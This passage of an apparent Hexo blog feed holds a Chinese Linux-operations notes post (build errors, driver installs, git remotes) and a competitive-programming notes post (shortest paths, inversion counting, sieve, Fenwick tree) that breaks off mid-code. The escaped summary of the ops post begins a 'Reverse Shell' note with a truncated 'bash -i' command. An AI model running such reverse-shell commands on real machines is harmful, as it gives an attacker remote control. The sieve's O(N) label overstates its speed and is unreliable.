rel="noopener">使用grub2制作启动U盘</a>，尝试把grub配置换为该链接的配置，可以启动到deepin进行安装，但是中途说挂载某分区失败从而安装失败<br><img src="./LinuxInstall_1.jpg" alt="错误信息"></li></ul><h3 id="OSC提供的代码make不过"><a href="#OSC提供的代码make不过" class="headerlink" title="OSC提供的代码make不过"></a>OSC提供的代码make不过</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">source code 9th/final-src-osc9e/ch2 </span><br><span class="line">➜ make                                                             </span><br><span class="line">make -C /lib/modules/4.9.0-deepin13-amd64/build M=/home/hzx/Program/source code 9th/final-src-osc9e/ch2 modules</span><br><span class="line"><span class="section">make[1]: Entering directory '/usr/src/linux-headers-4.9.0-deepin13-amd64'</span></span><br><span class="line"><span class="section">arch/x86/Makefile:140: CONFIG_X86_X32 enabled but no binutils support</span></span><br><span class="line"><span class="section">make[3]: *** No rule to make target 'code'.  Stop.</span></span><br><span class="line"><span class="section">Makefile:150: recipe for target 'sub-make' failed</span></span><br><span class="line"><span class="section">make[2]: *** [sub-make] Error 2</span></span><br><span class="line"><span class="section">Makefile:8: recipe for target 'all' failed</span></span><br><span class="line"><span class="section">make[1]: *** [all] Error 2</span></span><br><span class="line"><span class="section">make[1]: Leaving directory '/usr/src/linux-headers-4.9.0-deepin13-amd64'</span></span><br><span class="line"><span class="section">Makefile:3: recipe for target 'all' failed</span></span><br><span class="line"><span class="section">make: *** [all] Error 2</span></span><br></pre></td></tr></table></figure><p>解决方法，把source code 9th这个文件名的空格去掉</p><h3 id="vim-dos-unix"><a href="#vim-dos-unix" class="headerlink" title="vim dos unix"></a>vim dos unix</h3><ul><li>如果某文本文件的行末都有0d0a，则vim直接打开识别为dos。如果是vim -b 打开，识别为unix。如果最后一行不是0d0a，其他行是，不识别为dos。</li></ul><h3 id="删除文件名以-开头的文件"><a href="#删除文件名以-开头的文件" class="headerlink" title="删除文件名以-开头的文件"></a>删除文件名以<code>-</code>开头的文件</h3><ul><li>比如删除<code>-a</code>：<code>rm -- -a</code></li></ul><h3 id="文件的change，modification时间"><a href="#文件的change，modification时间" class="headerlink" title="文件的change，modification时间"></a>文件的change，modification时间</h3><ul><li>以下来自于实验：change是修改属性，比如<code>touch -d 1111 filename</code>，modification是修改内容</li></ul><h3 id="ctags-注意事项"><a href="#ctags-注意事项" class="headerlink" title="ctags 注意事项"></a>ctags 注意事项</h3><ul><li>如果某文件打开后编辑过，可能ctags打的tag就失效了（比如行号不对），所以跳转无效</li></ul><h3 id="watch命令"><a href="#watch命令" class="headerlink" title="watch命令"></a>watch命令</h3><ul><li><code>watch -n 0.1 ./a.o</code> 与<code>watch ./a.o -n 0.1</code>的区别是前者<code>-n 0.1</code>是watch的参数，后者是<code>./a.o</code>的参数</li></ul><h3 id="修复light-display-manger失败"><a href="#修复light-display-manger失败" class="headerlink" title="修复light display manger失败"></a>修复light display manger失败</h3><ul><li>通过启动时的错误信息，还有single模式中，service lightdm start后的错误信息（systemctl service ）可以知道light display manager启动失败</li><li>搜到的都说重新安装dde，但是需要网络，而single-user mode 是没有网络的。然后其他模式又没搜到要怎么进去，到是grub图形界面有提供一个带网络的recovery模式，不过我没有grub图形界面</li><li>就搜了搜在single模式联网——按照定义，single模式是没有网络的。然后联网后install dde，中途flatpak提示desktopRecord.service不存在，然后错误处理ctrl-c了dde的安装过程。然后后来按照dde的安装信息提示安装其他组件console-setup，然后使用sudo apt-get install –reinstall dde修复了dde的安装（apt -f在这里是没用的）</li><li>不知道为什么中途提示proxychain 的配置文件修改了</li><li>本来想着要是没网，就下个lightdm 来安装，结果没有binary的文件，装不了。</li><li>后来安装好dde后startx老是说成功退出——没有任何报错信息，都是成功，连退出都是成功退出，但是就是不符合我的预期</li></ul><h3 id="查看glibc版本"><a href="#查看glibc版本" class="headerlink" title="查看glibc版本"></a>查看glibc版本</h3><ul><li><code>ldd --version</code></li><li><code>getconf GNU_LIBC_VERSION</code></li></ul><h3 id="shell使用-时的SIGPIPE"><a href="#shell使用-时的SIGPIPE" class="headerlink" title="shell使用|时的SIGPIPE"></a>shell使用<code>|</code>时的SIGPIPE</h3><ul><li>比如<code>proc_1 | proc_2</code>，如果第二个进程关闭，第一个就会管道破裂，如果没有处理就会die</li></ul><h3 id="安装nvidia驱动"><a href="#安装nvidia驱动" class="headerlink" title="安装nvidia驱动"></a>安装nvidia驱动</h3><ul><li>在nvidia官网下程序</li><li><code>telinit 3</code>关掉<code>X server</code>（或者是systemctl stop lightdm.service）</li><li><p>安装过程中需要编译内核模块，编译时使用的gcc版本要与编译内核的gcc版本一致</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat /proc/version</span><br><span class="line">Linux version 4.15.0-29deepin-generic (pbuilder@zs-PC) (gcc version 7.3.0 (Debian 7.3.0-19)) #31 SMP Fri Jul 27 07:12:08 UTC 2018</span><br></pre></td></tr></table></figure></li><li><p>安装时，如果有驱动占用了gpu，那么会失败，在<code>/etc/modprobe.d/</code>加一个文件（命名为<code>*.conf</code>）</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">blacklist nouveau</span><br><span class="line">blacklist rivafb</span><br><span class="line">blacklist rivatv</span><br><span class="line">blacklist nvidiafb</span><br><span class="line"></span><br><span class="line"># 下面这几条应该可以不用，我不加也成功</span><br><span class="line">options nouveau modeset=0 </span><br><span class="line">options rivafb modeset=0</span><br><span class="line">options rivatv modeset=0</span><br><span class="line">options nvidiafb modeset=0</span><br></pre></td></tr></table></figure></li><li><p>安装过程中我一开始选使用dkms，但是失败，后来没选，也失败了几次，所以不清楚dkms的情况</p></li><li>安装后要运行<code>nvidia-xconfig</code>配置<code>/etc/X11/xorg.conf</code>，或者自己手动配置（然而我这里一直失败，一加相关的东西就启动卡住，而且也没有报错信息——我们又看其他信息，不知道其他信息有没有提示）</li><li>然而。事情没那么简单，我装了nvidia驱动后，deepin-wm cpu占用率飙升，nvidia-smi看不到使用gpu的进程，gg。没办法，卸了驱动，删了blacklist</li><li>后来发现deepin有个gpu driver manager，运行后，跑了很久，重启后还跑了很久，还看到一堆error，然后还开一个渲染画面让我看看渲染得咋样，然后后来启动成功，nvidia-smi也看到有deepin-wm的进程跑在gpu上，deepin-wm的cpu占用率也没有飙升，还行</li></ul><h3 id="Tilix-dont-inherit-the-directory"><a href="#Tilix-dont-inherit-the-directory" class="headerlink" title="Tilix dont inherit the directory"></a>Tilix dont inherit the directory</h3><ul><li><a href="https://github.com/gnunn1/tilix/wiki/VTE-Configuration-Issue" target="_blank" rel="noopener">The VTE matter this</a></li></ul><h3 id="sogouPinyin候选框异常解决方法"><a href="#sogouPinyin候选框异常解决方法" class="headerlink" title="sogouPinyin候选框异常解决方法"></a>sogouPinyin候选框异常解决方法</h3><ul><li>其实也不算解决，我在配置文件里把所有能关掉skin的选项都关了，sougou还是不使用fcitx的skin，删了<code>~/.config</code>下面的sogou相关配置文件也没用</li><li>后来发现，如果有其他输入法一起，然后切换过其他输入法，sogoupinyin的皮肤就跟那个输入法的一样（也不知道是不是一样，我的fcitx不能切换皮肤，所有只有一个皮肤）</li></ul><h3 id="cache的详细信息（包括相联度，电压等）"><a href="#cache的详细信息（包括相联度，电压等）" class="headerlink" title="cache的详细信息（包括相联度，电压等）"></a>cache的详细信息（包括相联度，电压等）</h3><ul><li><code>sudo dmidecode -t 7</code></li><li><code>getconf -a | grep CACHE</code></li></ul><h3 id="设置默认浏览器"><a href="#设置默认浏览器" class="headerlink" title="设置默认浏览器"></a>设置默认浏览器</h3><ul><li><code>xdg-settings set default-web-browser chrome.desktop</code></li><li><code>xdg-settings get default-web-browser</code>获取值</li><li>关于desktop文件的<code>Exec</code>段中的后缀，<a href="https://specifications.freedesktop.org/desktop-entry-spec/latest/ar01s07.html" target="_blank" rel="noopener">doc</a><blockquote><p>%i    The Icon key of the desktop entry expanded as two arguments, first –icon and then the value of the Icon key. Should not expand to any arguments if the Icon key is empty or missing.<br>%c    The translated name of the application as listed in the appropriate Name key in the desktop entry.<br>%k    The location of the desktop file as either a URI (if for example gotten from the vfolder system) or a local filename or empty if no location is known.<br>%f    A single file name (including the path), even if multiple files are selected. The system reading the desktop entry should recognize that the program in question cannot handle multiple file arguments, and it should should probably spawn and execute multiple copies of a program for each selected file if the program is not able to handle additional file arguments. If files are not on the local file system (i.e. are on HTTP or FTP locations), the files will be copied to the local file system and %f will be expanded to point at the temporary file. Used for programs that do not understand the URL syntax.<br>%F    A list of files. Use for apps that can open several local files at once. Each file is passed as a separate argument to the executable program.<br>%u    A single URL. Local files may either be passed as file: URLs or as file path.<br>%U    A list of URLs. Each URL is passed as a separate argument to the executable program. Local files may either be passed as file: URLs or as file path.</p></blockquote></li></ul><h3 id="github账户有设置ssh但是仓库push还是要用户密码的解决方法"><a href="#github账户有设置ssh但是仓库push还是要用户密码的解决方法" class="headerlink" title="github账户有设置ssh但是仓库push还是要用户密码的解决方法"></a>github账户有设置ssh但是仓库push还是要用户密码的解决方法</h3><ul><li>这是因为remote add时使用的是https，而不是ssh</li><li><code>git remote -v</code>可以看到是https链接</li><li><code>git remote set-url origin git@github.com:USERNAME/REPOSITORY.git</code>改为ssh</li><li><a href="https://help.github.com/articles/changing-a-remote-s-url/" target="_blank" rel="noopener">参考</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Reverse-Shell&quot;&gt;&lt;a href=&quot;#Reverse-Shell&quot; class=&quot;headerlink&quot; title=&quot;Reverse Shell&quot;&gt;&lt;/a&gt;Reverse Shell&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;受控机器上执行&lt;code&gt;bash -i
      
    
    </summary>
    
      <category term="运维" scheme="https://h-zex.github.io/categories/%E8%BF%90%E7%BB%B4/"/>
    
    
      <category term="ITOps" scheme="https://h-zex.github.io/tags/ITOps/"/>
    
  </entry>
  
  <entry>
    <title>My ACM Note</title>
    <link href="https://h-zex.github.io/2018/02/02/My-ACM-Note/"/>
    <id>https://h-zex.github.io/2018/02/02/My-ACM-Note/</id>
    <published>2018-02-02T05:31:40.000Z</published>
    <updated>2019-07-02T15:43:52.353Z</updated>
    
    <content type="html"><![CDATA[<h3 id="全源最短路径的一种错误解法"><a href="#全源最短路径的一种错误解法" class="headerlink" title="全源最短路径的一种错误解法"></a>全源最短路径的一种错误解法</h3><ul><li><p>错误代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (~<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N)) &#123;</span><br><span class="line">        <span class="comment">// assume that if no edge i-&gt;j, then input w[i][j] will be INF</span></span><br><span class="line">        <span class="comment">// and assume that w[i][i] == 0</span></span><br><span class="line">        FWD(i, <span class="number">0</span>, N) &#123;</span><br><span class="line">            FWD(j, <span class="number">0</span>, N) &#123;</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;w[i][j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(dp, <span class="number">0xff</span>, <span class="keyword">sizeof</span>(dp));</span><br><span class="line">        FWD(i, <span class="number">0</span>, N) &#123;</span><br><span class="line">            FWD(j, <span class="number">0</span>, N) &#123;</span><br><span class="line">                <span class="comment">// if i == j, dfs can still return true answer</span></span><br><span class="line">                dfs(i, j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        FWD(i, <span class="number">0</span>, N) &#123;</span><br><span class="line">            FWD(j, <span class="number">0</span>, N) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%15d"</span>, dp[i][j]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> visit[MAXV];</span><br><span class="line"><span class="keyword">int</span> __dfs(<span class="keyword">int</span> now, <span class="keyword">int</span> target);</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> from, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(visit, <span class="number">0</span>, <span class="keyword">sizeof</span>(visit));</span><br><span class="line">    visit[from] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> __dfs(from, target);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> __dfs(<span class="keyword">int</span> now, <span class="keyword">int</span> target) &#123;</span><br><span class="line">    <span class="keyword">if</span> (dp[now][target] &gt; <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> dp[now][target];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (now == target) &#123;</span><br><span class="line">        dp[now][target] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// visit[now] will never be true;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans = INF;</span><br><span class="line">    FWD(i, <span class="number">0</span>, N) &#123;</span><br><span class="line">        <span class="keyword">if</span> (visit[i] || w[now][i] == INF || i==now) &#123; <span class="comment">// avoid rings and not edge</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        visit[i] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">int</span> p = __dfs(i, target) + w[now][i];</span><br><span class="line">        visit[i] = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (p &lt; ans) &#123;</span><br><span class="line">            NEXT[now][target] = i; <span class="comment">// record the NEXT vertex of i in the shortest path now-&gt;target</span></span><br><span class="line">            ans = p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    dp[now][target] = ans;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>不可以使用这种dp</p></li><li><p>对于每对点执行dfs，然后执行过程中，记忆化搜索。当然，为了避免执行过程出现不断的走环路的情况，需要使用visit，避免dfs过程中走环路。</p></li><li><p>虽然复杂度是$O(V^3)$ ，但是算法是错的</p></li><li><p>记忆化搜索计算$(begin,target)$ 时，假设dfs过程中经过了点<code>i</code> ，为了避免环，<code>i</code>不可以经过<code>begin</code>，但是，可能$(i,target)$ 的最优路径就是<code>i</code>经过点<code>begin</code> 到达的。</p></li><li><p>但是，记忆化过程中，却把在dfs$(begin,target)$过程中 计算出来的$(i,target)$ 作为<code>i</code> 到<code>target</code> 的结果。</p></li></ul><h3 id="NYOJ7"><a href="#NYOJ7" class="headerlink" title="NYOJ7"></a>NYOJ7</h3><blockquote><h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述:"></a>题目描述:</h5><p>一个街区有很多住户，街区的街道只能为东西、南北两种方向。<br>住户只可以沿着街道行走。<br>各个街道之间的间隔相等。<br>用(x,y)来表示住户坐在的街区。<br>例如（4,20），表示用户在东西方向第4个街道，南北方向第20个街道。<br>现在要建一个邮局，使得各个住户到邮局的距离之和最少。<br>求现在这个邮局应该建在那个地方使得所有住户距离之和最小；</p><h5 id="输入描述"><a href="#输入描述" class="headerlink" title="输入描述:"></a>输入描述:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; 第一行一个整数n&lt;20，表示有n组测试数据，下面是n组数据;</span><br><span class="line">&gt; 每组第一行一个整数m&lt;20,表示本组有m个住户，下面的m行每行有两个整数0&lt;x,y&lt;100，表示某个用户所在街区的坐标。</span><br><span class="line">&gt; m行后是新一组的数据；</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><h5 id="输出描述"><a href="#输出描述" class="headerlink" title="输出描述:"></a>输出描述:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; 每组数据输出到邮局最小的距离和，回车结束；</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><h5 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入:"></a>样例输入:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt; 2</span><br><span class="line">&gt; 3</span><br><span class="line">&gt; 1 1</span><br><span class="line">&gt; 2 1</span><br><span class="line">&gt; 1 2</span><br><span class="line">&gt; 5</span><br><span class="line">&gt; 2 9 </span><br><span class="line">&gt; 5 20</span><br><span class="line">&gt; 11 9</span><br><span class="line">&gt; 1 1</span><br><span class="line">&gt; 1 20</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><h5 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出:"></a>样例输出:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; 2</span><br><span class="line">&gt; 44</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><ul><li>考虑横坐标的情况，取那个横坐标可以使得大家的在横坐标上需要走的距离最短？显然是中位数——反证法，加入有N个点，如果N是奇数，那么中位数就是d[N/2]，然后，尝试采用第N/2-1个点计算，显然，总量的变化是（设 t = d[N/2]-d[N/2-1] ），$+t<em>(N/2+1)-t</em>N/2$ ，也就是缩短的对于前N/2的用户来说，是缩短了，但是对于后面N/2+1个用户来说延长了</li><li>所以，无论y坐标取值多少，x坐标都要取中位数。同理，y也要取中位数</li></ul><h3 id="01背包"><a href="#01背包" class="headerlink" title="01背包"></a>01背包</h3><ul><li>动态规划算法是伪多项式复杂度$O(NW)$，如果W很大，那么可能，直接枚举N元素的集合的所有子集会更快一些</li></ul><h3 id="找出一个序列中任意长度的逆序对"><a href="#找出一个序列中任意长度的逆序对" class="headerlink" title="找出一个序列中任意长度的逆序对"></a>找出一个序列中任意长度的逆序对</h3><ul><li>首先定义什么是逆序对：比如一个序列是从小到大排列的，那么如果$x_i&gt;x_{i+1}&gt;x_{i+2}&gt;…$那么就是逆序对</li><li>主要思路是，对于n元逆序对，flag数组中的index表示某个序列中的某个等于index的数，而flag[index]的值表示以这个index结尾的n-1元的逆序对的数量</li><li>假设序列有n个数，数的范围是[0, MAX], 首先搞一个int flag[MAX+1], 该数组的所有值初始化为0，还有一个int result[n]</li><li>首先看看如何求二元逆序对<ul><li>从左到右扫描序列，对于值位置为<code>i</code>的值<code>x</code>，flag[x]+=1</li><li>然后此时，以该x结尾的逆序对的数量就是$\sum_{j=x+1}^{MAX}flag[j]$，将这个数量记录在result[i]</li><li>那么result的数组的和就是逆序对的数量</li><li>同样的，在刚才flag[x]+=1的步骤，可以输出后面的数与x组成的序对来输出具体的逆序对</li></ul></li><li>三元组的，我们已经用上面的方法求出二元的result数组(此处将其记为result_2数组)，此时设另外的两个数组int flag_3[MAX+1], int result_3[n];<ul><li>同样扫描序列，对于位置为<code>i</code>的数<code>x</code>，取出result_2[i]的值，也就是以该x结尾的二元组逆序对的数量m，然后flag_3[x]+=m。此时flag_3[x]记录了截止目前，以x结尾的二元组逆序对的数量</li><li>求$\sum_{j=x+1}^{MAX}flag_3[j]$，得到以x结尾的三元组逆序对的数量，记录在result_3[i]中</li><li>到最后，result_3就是结果</li></ul></li><li>更多元组的也如此思路</li><li>这是利用数组记录了当前已经有的数，然后新加入的数如果不是该数组中当前index最大的，那么意味着其比之前加入的一些数小，这就形成了逆序对</li><li>对于n元逆序对，同理，数组记录了当前已有的数<code>x</code>作为<code>最后一个元素是x的n-1元逆序对</code>的逆序对的数量，然后如果我们往该数组加入一个数，然后这个数不是index最大的，那么其比之前已经加入的一些数小，从而与<code>比他大的数代表的n-1元逆序对</code>形成了更长的逆序对</li><li>然后，既然这其中，对数组求和很重要，我们就可以利用树状数组优化这个往flag[x]中增加数值然后求和计算出对应result[i]的过程（原始序对中第<code>i</code>位的值是<code>x</code>）</li></ul><blockquote><p>3p另一种思路：针对三元逆序对，还有一种简单的解法，先把数据按顺序插入，用树形数组记录此时比这个数大的数的数目x，再把数据倒着插入，用另一个树形数组记录此时比这个数小的数的数目y，x*y=以这个数为中心的三元逆数对数目，把各个数计算累计起来即可（来自17级大佬Potatso）</p></blockquote><h3 id="关于使用优先队列的bfs"><a href="#关于使用优先队列的bfs" class="headerlink" title="关于使用优先队列的bfs"></a>关于使用优先队列的bfs</h3><ul><li>其实就是dijstra单源最短路径算法</li><li>关于O((V+E)lgV)：对每个点都需要从堆中pop出来（除了源点），对于每条边，都需要把该边对应的一个点压进堆里或者decrease key，consider that，如果一个点被pop出来，那么该点就在result set里，所以不会再被压到堆里。所以是O((V+E)lgV)，如果使用斐波那契堆，因为压到堆里以及decrease key的代价是O(1)，所以是O(VlgV+E)</li></ul><h3 id="DP"><a href="#DP" class="headerlink" title="DP"></a>DP</h3><ul><li>DP要找到什么因素影响了当前你要求的东西，有影响的我们就处理，没影响的我们不用管</li></ul><h3 id="浮点数输入"><a href="#浮点数输入" class="headerlink" title="浮点数输入"></a>浮点数输入</h3><ul><li>由于是二进制，所以有些十进制有限小数成了无限的，所以读取时会截断，所以要加上一个偏移量（比如读入到小数点后6位，可以加一个$2*10^{-7}$，这样，截断部分如果比较大，就可以反映出来，如果比较小，不会对产生进位，则没影响）</li></ul><h3 id="枚举所有素数"><a href="#枚举所有素数" class="headerlink" title="枚举所有素数"></a>枚举所有素数</h3><ul><li>$O(N)$ 的做法 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> CNT = (<span class="keyword">int</span>)<span class="number">1e9</span>+<span class="number">10</span>;</span><br><span class="line"><span class="keyword">bool</span> a[CNT];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    a[<span class="number">0</span>] = a[<span class="number">1</span>] = <span class="literal">true</span>;</span><br><span class="line">    FWD(i, <span class="number">2</span>, CNT) &#123;</span><br><span class="line">        <span class="keyword">if</span> (a[i]) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">2</span> * i; j &lt; CNT; j += i) &#123;</span><br><span class="line">             a[j] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="树状数组"><a href="#树状数组" class="headerlink" title="树状数组"></a>树状数组</h3><ul><li><p>注意，a[0]是没有放东西的，因为$i-lowbit(i)+1 &gt; 0$</p></li><li><p>插线问点中，每一点 i 的值都是 sum(a[1] to a[i])。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//NYOJ 123</span></span><br><span class="line"><span class="keyword">int</span> c[<span class="number">1000010</span>],N;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lowbit</span><span class="params">(<span class="keyword">int</span> x)</span> <span class="comment">//求最低位1的位置所表示的数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x&amp;(-x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> p,<span class="keyword">int</span> q)</span><span class="comment">//常规数组中的a[p]更新，在树状数组中需要这样更新</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(p&lt;=N)</span><br><span class="line">    &#123;</span><br><span class="line">        c[p]+=q;</span><br><span class="line">        p+=lowbit(p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">S</span><span class="params">(<span class="keyword">int</span> x)</span>  <span class="comment">//S(i)表示的是的前i个数的和</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(x&gt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sum+=c[x];</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"sum: "</span>&lt;&lt;sum&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">        x-=lowbit(x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;T,&amp;N);</span><br><span class="line">    <span class="keyword">while</span>(T--)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>,s);</span><br><span class="line">        <span class="keyword">if</span>(s[<span class="number">0</span>]==<span class="string">'A'</span>)&#123;</span><br><span class="line">            <span class="keyword">int</span> l,r,num;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>,&amp;l,&amp;r,&amp;num);</span><br><span class="line">            update(l,num);</span><br><span class="line">            update(r+<span class="number">1</span>,-num);</span><br><span class="line">          <span class="comment">//每个士兵 i 的军功都是前 i 个元素的和，所以，[l, m]区间每个人加 num 的军功只需要给</span></span><br><span class="line">          <span 